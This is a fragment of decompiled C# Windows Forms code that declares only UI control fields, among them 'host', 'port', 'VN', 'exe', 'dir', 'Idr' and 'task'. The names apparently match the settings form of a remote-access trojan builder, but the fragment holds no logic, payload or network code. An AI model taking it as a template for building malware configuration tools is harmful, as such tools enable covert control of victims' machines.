		// Token: 0x0400005D RID: 93
		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		// Token: 0x0400005E RID: 94
		[AccessedThroughProperty("CheckBox1")]
		private CheckBox _CheckBox1;

		// Token: 0x0400005F RID: 95
		[AccessedThroughProperty("Idr")]
		private CheckBox _Idr;

		// Token: 0x04000060 RID: 96
		[AccessedThroughProperty("dir")]
		private ComboBox _dir;

		// Token: 0x04000061 RID: 97
		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		// Token: 0x04000062 RID: 98
		[AccessedThroughProperty("exe")]
		private TextBox _exe;

		// Token: 0x04000063 RID: 99
		[AccessedThroughProperty("GroupBox1")]
		private GroupBox _GroupBox1;

		// Token: 0x04000064 RID: 100
		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		// Token: 0x04000065 RID: 101
		[AccessedThroughProperty("VN")]
		private TextBox _VN;

		// Token: 0x04000066 RID: 102
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000067 RID: 103
		[AccessedThroughProperty("port")]
		private NumericUpDown _port;

		// Token: 0x04000068 RID: 104
		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		// Token: 0x04000069 RID: 105
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x0400006A RID: 106
		[AccessedThroughProperty("host")]
		private TextBox _host;

		// Token: 0x0400006B RID: 107
		[AccessedThroughProperty("Lv1")]
		private LV _Lv1;

		// Token: 0x0400006C RID: 108
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		// Token: 0x0400006D RID: 109
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x0400006E RID: 110
		[AccessedThroughProperty("task")]
		private CheckBox _task;

		// Token: 0x0400006F RID: 111
		private string string_0;
	}
}
